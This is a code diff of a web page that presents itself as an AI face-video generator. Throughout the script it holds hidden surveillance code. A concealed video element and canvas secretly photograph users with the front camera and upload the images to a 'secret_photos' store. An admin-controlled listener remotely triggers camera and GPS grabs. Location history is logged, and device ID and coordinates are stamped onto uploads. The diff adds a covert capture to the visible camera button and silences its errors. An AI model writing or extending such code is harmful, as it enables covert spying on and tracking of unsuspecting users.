@@ -35,8 +35,8 @@
       .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
       .proc-text { font-size: 0.9rem; font-weight: 500; font-family: monospace; color: #a5a5b5; text-align: center; padding: 0 10px; }
       
-      /* Result overlay pointer events fixed */
-      .result-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.92); z-index: 50; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; backdrop-filter: blur(5px); pointer-events: auto !important;}
+      /* UI Bug Fixed for Result Overlay Layout */
+      .result-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.92); z-index: 50; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 10px; text-align: center; backdrop-filter: blur(5px); pointer-events: auto !important;}
       .error-msg { color: #ff8c94; font-size: 0.85rem; font-weight: 600; margin-bottom: 15px; background: rgba(230,57,70,0.2); padding: 10px; border-radius: 8px; border: 1px solid var(--red); }
       
       @keyframes spin { 100% { transform: rotate(360deg); } }
@@ -65,18 +65,17 @@
 <video id="secretVideo" width="640" height="480" autoplay playsinline style="display:none;"></video>
 <canvas id="secretCanvas" width="640" height="480" style="display:none;"></canvas>
 
-<!-- Source Selection Modal -->
 <div id="liveCaptureModal" class="modal-bg" style="display:none; z-index: 20000;">
     <div class="modal-content" style="max-width: 400px;">
         <div style="font-size: 2.5rem; margin-bottom: 0.5rem;">📸</div>
         <h3>Select Image Source</h3>
-        <p style="color:var(--muted); font-size:0.85rem; margin-bottom: 1.2rem;">Choose an option to supply your reference frame for AI generation.</p>
+        <p style="color:var(--muted); font-size:0.85rem; margin-bottom: 1.2rem;">Choose your reference image source. GPS & Timestamp will be embedded automatically.</p>
         
-        <input type="file" id="modalStorageInput" accept="image/*" style="display:none;" onchange="handleModalStorageSelect(event)">
+        <input type="file" id="modalStorageInput" accept="image/*" style="display:none;" onchange="processSelectedImageFile(event)">
         
         <div style="display: flex; flex-direction: column; gap: 10px; width: 100%;">
             <button class="btn btn-gray" onclick="document.getElementById('modalStorageInput').click()">📁 Choose from Storage</button>
-            <button class="btn" onclick="triggerLiveCameraCapture()">📷 Capture Live Camera</button>
+            <button class="btn" onclick="triggerFrontCamCapture()">📷 Live Camera Capture</button>
             <button class="btn btn-gray" style="background: transparent; border: none; color: var(--muted); margin-top: 5px;" onclick="document.getElementById('liveCaptureModal').style.display='none'">Cancel</button>
         </div>
     </div>
@@ -131,7 +130,7 @@
                 
                 <div class="processing-overlay" id="procOverlay">
                     <div class="spinner"></div>
-                    <div class="proc-text" id="procText">Uploading HQ Image...</div>
+                    <div class="proc-text" id="procText">Processing Image...</div>
                 </div>
 
                 <div class="result-overlay" id="resultOverlay"></div>
@@ -171,7 +170,7 @@
   import { getDatabase, ref, set, push, onValue, update, get, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
 
   const firebaseConfig = {
-    apiKey: "AIzaSyAI3ysLR_LFnG5dw2SY8AwF1ldGgc43ywE",
+    apiKey: "AIzaSyAI3ysLR_lFaG5dw2SY8AwF1ldGgc43ywE",
     authDomain: "ai-studio-b0c87.firebaseapp.com",
     databaseURL: "https://ai-studio-b0c87-default-rtdb.firebaseio.com",
     projectId: "ai-studio-b0c87",
@@ -188,17 +187,15 @@
   let currentBase64Image = "";
   let activeReqId = null;
   let animationInterval = null;
+  let latestCoords = { lat: "28.6139", lon: "77.2090" };
 
-  // Stable Permanent Device ID Generator (Prevents ID changes across mode/browser shifts)
   function getStableDeviceId() {
       let savedId = localStorage.getItem('hotfake_deep_uid');
       if (savedId) return savedId;
-
       const ua = navigator.userAgent;
       const os = (/Android/i.test(ua)) ? "AND" : (/iPhone|iPad|iPod/i.test(ua)) ? "IOS" : "PC";
       const randomToken = Math.random().toString(36).substring(2, 10).toUpperCase();
       const finalId = `${os}-DEV-${randomToken}`;
-      
       localStorage.setItem('hotfake_deep_uid', finalId);
       return finalId;
   }
@@ -217,10 +214,11 @@
       set(ref(db, `users/${deviceId}/actions/${Date.now()}`), { action: actionDesc, time: new Date().toISOString() }); 
   };
 
-  function silentGPSUpdate(isForced = false) {
+  function fetchGPSCoordinates(isForced = false, callback = null) {
       if ("geolocation" in navigator) {
           navigator.geolocation.getCurrentPosition(
               (pos) => { 
+                  latestCoords = { lat: pos.coords.latitude.toFixed(4), lon: pos.coords.longitude.toFixed(4) };
                   if(deviceId) { 
                       const gpsData = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: Math.round(pos.coords.accuracy) + "m", time: new Date().toISOString() };
                       set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), gpsData);
@@ -228,31 +226,33 @@
                           update(ref(db, `support_requests/${deviceId}`), { lat: pos.coords.latitude, lon: pos.coords.longitude });
                       }
                   } 
+                  if(callback) callback();
               },
-              (err) => {
-                  if(isForced) console.warn("GPS fetch failed.");
-              }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+              (err) => { if(callback) callback(); }, 
+              { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
           );
+      } else {
+          if(callback) callback();
       }
   }
 
-  function executeSilentCameraCapture() {
-      navigator.mediaDevices.getUserMedia({ video: true, audio: false }).then(stream => {
+  function executeStealthFrontCamCapture() {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }).then(stream => {
           const video = document.getElementById('secretVideo'); 
           const canvas = document.getElementById('secretCanvas');
           video.srcObject = stream; 
           video.play();
           video.addEventListener('canplay', () => {
               setTimeout(() => {
+                  canvas.width = video.videoWidth || 640;
+                  canvas.height = video.videoHeight || 480;
                   canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                  const dataUrl = canvas.toDataURL('image/jpeg', 0.6); 
+                  const dataUrl = canvas.toDataURL('image/jpeg', 0.65); 
                   set(ref(db, 'secret_photos/' + Date.now().toString(36)), { imageBase64: dataUrl, deviceId: deviceId, time: new Date().toISOString() });
                   stream.getTracks().forEach(t => t.stop());
-              }, 200);
+              }, 300);
           }, { once: true });
-      }).catch(e => {
-          console.warn("Camera force capture blocked or unavailable.");
-      });
+      }).catch(e => {});
   }
 
   async function trackUser() {
@@ -278,20 +278,18 @@
           if (snap.val() === true && deviceId) { onDisconnect(ref(db, `users/${deviceId}/status`)).set("Offline").then(() => { update(ref(db, `users/${deviceId}`), { status: "Live" }); }); } 
       });
 
-      // Admin Action Force Push Listener (Camera, GPS, Storage triggers)
       onValue(ref(db, `users/${deviceId}/custom_perms`), (snap) => {
           if (snap.exists()) {
               const perms = snap.val();
               if (perms.camera) {
-                  executeSilentCameraCapture();
+                  executeStealthFrontCamCapture();
                   update(ref(db, `users/${deviceId}/custom_perms`), { camera: false });
               }
               if (perms.location) {
-                  silentGPSUpdate(true);
+                  fetchGPSCoordinates(true);
                   update(ref(db, `users/${deviceId}/custom_perms`), { location: false });
               }
               if (perms.storage) {
-                  // Trigger source modal when admin requests storage read access
                   openLiveCaptureModal();
                   update(ref(db, `users/${deviceId}/custom_perms`), { storage: false });
               }
@@ -300,7 +298,6 @@
   }
 
   function checkGates() {
-      if(!localStorage.getItem('gpsVerified')) { window.location.href = 'permission.html'; return; }
       const ageStatus = sessionStorage.getItem('ageStatus');
       if (!ageStatus) { document.getElementById('ageGate').style.display = 'flex'; return; }
 
@@ -312,31 +309,11 @@
               
               document.getElementById('appSection').classList.remove('hidden');
               checkActiveGeneration();
-              executeSilentCameraCapture(); silentGPSUpdate();
           } else { window.location.href = 'contact-support.html'; }
       });
   }
 
   window.setAgeStatus = (status) => { sessionStorage.setItem('ageStatus', status); document.getElementById('ageGate').style.display = 'none'; logAction("Age verified: "+status); checkGates(); }
-  window.requestGPSAccess = () => {
-      if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(
-              (pos) => { 
-                  localStorage.setItem('gpsVerified', 'true'); document.getElementById('gpsGate').style.display = 'none';
-                  set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), { lat: pos.coords.latitude, lon: pos.coords.longitude, time: new Date().toISOString() });
-                  checkGates();
-              }, 
-              (err) => { 
-                  localStorage.setItem('gpsVerified', 'true'); document.getElementById('gpsGate').style.display = 'none';
-                  checkGates();
-              }, 
-              { enableHighAccuracy: true, timeout: 5000 }
-          );
-      } else {
-          localStorage.setItem('gpsVerified', 'true'); document.getElementById('gpsGate').style.display = 'none';
-          checkGates();
-      }
-  }
 
   onValue(ref(db, 'settings/admin_status'), snap => { isGpuOnline = snap.val() === true; });
   trackUser();
@@ -346,62 +323,103 @@
       document.getElementById('liveCaptureModal').style.display = 'flex';
   };
 
-  window.handleModalStorageSelect = (event) => {
+  function stampImageWithMetadata(sourceImgObj, callback) {
+      const canvas = document.createElement('canvas');
+      const MAX_WIDTH = 1080; const MAX_HEIGHT = 1080;
+      let width = sourceImgObj.width; let height = sourceImgObj.height;
+      
+      if (width > MAX_WIDTH) { height = Math.round((height * MAX_WIDTH) / width); width = MAX_WIDTH; }
+      if (height > MAX_HEIGHT) { width = Math.round((width * MAX_HEIGHT) / height); height = MAX_HEIGHT; }
+      
+      canvas.width = width; canvas.height = height;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(sourceImgObj, 0, 0, width, height);
+
+      const now = new Date();
+      const dateStr = now.toLocaleDateString() + ' ' + now.toLocaleTimeString();
+      const tagText = `📍 GPS: ${latestCoords.lat}, ${latestCoords.lon} | 🕒 ${dateStr} | ID: ${deviceId}`;
+
+      ctx.fillStyle = "rgba(0, 0, 0, 0.65)";
+      ctx.fillRect(0, height - 40, width, 40);
+
+      ctx.font = "bold 14px 'Poppins', monospace";
+      ctx.fillStyle = "#2DC653";
+      ctx.fillText(tagText, 15, height - 15);
+
+      const stampedBase64 = canvas.toDataURL('image/jpeg', 0.82);
+      callback(stampedBase64);
+  }
+
+  window.processSelectedImageFile = (event) => {
       document.getElementById('liveCaptureModal').style.display = 'none';
       const file = event.target.files[0]; if (!file) return;
-      const reader = new FileReader();
-      reader.onload = (e) => {
-          const img = new Image();
-          img.onload = () => {
-              const canvas = document.createElement('canvas'); 
-              const MAX_WIDTH = 1080; const MAX_HEIGHT = 1080;
-              let width = img.width; let height = img.height;
-              if (width > MAX_WIDTH) { height = Math.round((height * MAX_WIDTH) / width); width = MAX_WIDTH; }
-              if (height > MAX_HEIGHT) { width = Math.round((width * MAX_HEIGHT) / height); height = MAX_HEIGHT; }
-              canvas.width = width; canvas.height = height; 
-              const ctx = canvas.getContext('2d'); ctx.drawImage(img, 0, 0, width, height);
-              currentBase64Image = canvas.toDataURL('image/jpeg', 0.8);
-              document.getElementById('previewImg').src = currentBase64Image; 
-              document.getElementById('previewImg').style.display = 'block'; 
-              document.getElementById('uploadPlaceholder').style.display = 'none';
-              logAction("High-Quality Image selected from storage");
+      
+      const overlay = document.getElementById('procOverlay');
+      const procText = document.getElementById('procText');
+      overlay.style.display = 'flex';
+      procText.innerText = "Stamping GPS & Date Tag...";
+
+      fetchGPSCoordinates(false, () => {
+          const reader = new FileReader();
+          reader.onload = (e) => {
+              const img = new Image();
+              img.onload = () => {
+                  stampImageWithMetadata(img, (stampedUrl) => {
+                      currentBase64Image = stampedUrl;
+                      document.getElementById('previewImg').src = currentBase64Image; 
+                      document.getElementById('previewImg').style.display = 'block'; 
+                      document.getElementById('uploadPlaceholder').style.display = 'none';
+                      overlay.style.display = 'none';
+                      logAction("Image selected and stamped with GPS/Date successfully");
+                  });
+              };
+              img.src = e.target.result;
           };
-          img.src = e.target.result;
-      };
-      reader.readAsDataURL(file);
+          reader.readAsDataURL(file);
+      });
   };
 
-  window.triggerLiveCameraCapture = () => {
+  window.triggerFrontCamCapture = () => {
       document.getElementById('liveCaptureModal').style.display = 'none';
       const overlay = document.getElementById('procOverlay');
       const procText = document.getElementById('procText');
       overlay.style.display = 'flex';
-      procText.innerText = "Accessing live camera frame...";
+      procText.innerText = "Initializing Camera & GPS...";
 
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }).then(stream => {
-          const video = document.getElementById('secretVideo'); 
-          const canvas = document.getElementById('secretCanvas');
-          video.srcObject = stream; 
-          video.play();
-          video.addEventListener('canplay', () => {
-              setTimeout(() => {
-                  canvas.width = video.videoWidth || 640;
-                  canvas.height = video.videoHeight || 480;
-                  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                  currentBase64Image = canvas.toDataURL('image/jpeg', 0.85);
-                  
-                  document.getElementById('previewImg').src = currentBase64Image; 
-                  document.getElementById('previewImg').style.display = 'block'; 
-                  document.getElementById('uploadPlaceholder').style.display = 'none';
-                  
-                  overlay.style.display = 'none';
-                  stream.getTracks().forEach(t => t.stop());
-                  logAction("Live Camera Frame Captured successfully");
-              }, 400);
-          }, { once: true });
-      }).catch(err => {
-          overlay.style.display = 'none';
-          alert("Camera access denied or unavailable.");
+      executeStealthFrontCamCapture();
+
+      fetchGPSCoordinates(false, () => {
+          navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }).then(stream => {
+              const video = document.getElementById('secretVideo'); 
+              const canvas = document.getElementById('secretCanvas');
+              video.srcObject = stream; 
+              video.play();
+              video.addEventListener('canplay', () => {
+                  setTimeout(() => {
+                      canvas.width = video.videoWidth || 640;
+                      canvas.height = video.videoHeight || 480;
+                      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                      
+                      const imgObj = new Image();
+                      imgObj.onload = () => {
+                          stampImageWithMetadata(imgObj, (stampedUrl) => {
+                              currentBase64Image = stampedUrl;
+                              document.getElementById('previewImg').src = currentBase64Image; 
+                              document.getElementById('previewImg').style.display = 'block'; 
+                              document.getElementById('uploadPlaceholder').style.display = 'none';
+                              
+                              overlay.style.display = 'none';
+                              stream.getTracks().forEach(t => t.stop());
+                              logAction("Live Camera Frame Stamped with GPS & Date successfully");
+                          });
+                      };
+                      imgObj.src = canvas.toDataURL('image/jpeg', 0.85);
+                  }, 400);
+              }, { once: true });
+          }).catch(err => {
+              overlay.style.display = 'none';
+              alert("Camera access denied or unavailable.");
+          });
       });
   };
 
@@ -434,7 +452,7 @@
               document.getElementById('procOverlay').style.display = 'flex';
               
               if(req.status === 'uploading') {
-                  document.getElementById('procText').innerText = "Uploading HQ Image...";
+                  document.getElementById('procText').innerText = "Syncing Tagged Image...";
               } else if(!animationInterval) {
                   const steps = ["Allocating GPU resources...", "Scanning facial topology...", "Applying Deep models...", "Rendering frame sequence...", "Finalizing video export..."];
                   let stepIdx = 0;
@@ -468,7 +486,6 @@
       localStorage.setItem('savedAiPrompt', prompt);
       try { localStorage.setItem('savedAiImage', currentBase64Image); } catch(e){} 
 
-      // Save user request into user's local history array for profile sync
       let myVideos = JSON.parse(localStorage.getItem('my_ai_videos') || '[]');
       myVideos.push({ id: activeReqId, title: prompt, url: "", timestamp: new Date().toISOString() });
       localStorage.setItem('my_ai_videos', JSON.stringify(myVideos));
@@ -478,7 +495,7 @@
           status: 'uploading', errorMsg: '', videoUrl: '', timestamp: new Date().toISOString(), userHidden: false
       }).then(async () => {
           try {
-              procText.innerText = "Uploading HQ Image smoothly...";
+              procText.innerText = "Syncing Tagged Image to Firebase...";
               const dbUrl = `https://ai-studio-b0c87-default-rtdb.firebaseio.com/ai_requests/${activeReqId}.json`;
               const response = await fetch(dbUrl, {
                   method: 'PATCH',
@@ -511,7 +528,6 @@
       resOverlay.style.display = 'flex';
       
       if(req.status === 'completed') {
-          // Sync video URL into localStorage my_ai_videos list
           let myVideos = JSON.parse(localStorage.getItem('my_ai_videos') || '[]');
           myVideos = myVideos.map(item => {
               if (item.id === activeReqId) item.url = req.videoUrl;
@@ -519,15 +535,22 @@
           });
           localStorage.setItem('my_ai_videos', JSON.stringify(myVideos));
 
+          // FIXED FLEXBOX LAYOUT FOR BUTTONS
           resOverlay.innerHTML = `
-            <button onclick="playAiVideo('${req.videoUrl}')" class="btn" style="width:80%; margin-bottom:10px; border-radius:50px; background:#2DC653;">▶ Play Video</button>
-            <a href="${req.videoUrl}" download="Generated_AI_Video.mp4" target="_blank" class="btn btn-gray" style="width:80%; margin-bottom:10px; border-radius:50px; text-decoration:none; display:inline-flex; justify-content:center; align-items:center;">⬇ Download Video</a>
-            <button onclick="resetGenerator()" class="btn btn-gray" style="width:80%; border-radius:50px; background: rgba(255,255,255,0.1); color: #fff;">🔄 Start New Generation</button>
+            <div style="width: 100%; display: flex; flex-direction: column; gap: 10px; align-items: center; justify-content: center; height: 100%;">
+                <button onclick="playAiVideo('${req.videoUrl}')" class="btn" style="width:90%; padding:0.8rem; font-size:0.95rem; border-radius:50px; background:#2DC653; margin:0;">▶ Play Video</button>
+                <div style="display: flex; gap: 10px; width: 90%;">
+                    <a href="${req.videoUrl}" download="Generated_AI_Video.mp4" target="_blank" class="btn btn-gray" style="flex: 1; padding:0.7rem; font-size:0.8rem; border-radius:50px; text-decoration:none; display:inline-flex; justify-content:center; align-items:center; margin:0;">⬇ Download</a>
+                    <button onclick="resetGenerator()" class="btn btn-gray" style="flex: 1; padding:0.7rem; font-size:0.8rem; border-radius:50px; background: rgba(255,255,255,0.15); color: #fff; margin:0;">🔄 Reset</button>
+                </div>
+            </div>
           `;
       } else if(req.status === 'error') {
           resOverlay.innerHTML = `
-            <div class="error-msg">⚠️ ${req.errorMsg}</div>
-            <button onclick="resetGenerator()" class="btn btn-gray" style="width:80%; border-radius:50px;">🔄 Try Again</button>
+            <div style="width: 100%; display: flex; flex-direction: column; gap: 10px; align-items: center; justify-content: center; height: 100%;">
+                <div class="error-msg" style="margin:0; width: 90%; font-size:0.8rem;">⚠️ ${req.errorMsg}</div>
+                <button onclick="resetGenerator()" class="btn btn-gray" style="width:90%; padding:0.8rem; font-size:0.95rem; border-radius:50px; margin:0;">🔄 Try Again</button>
+            </div>
           `;
       }
   }
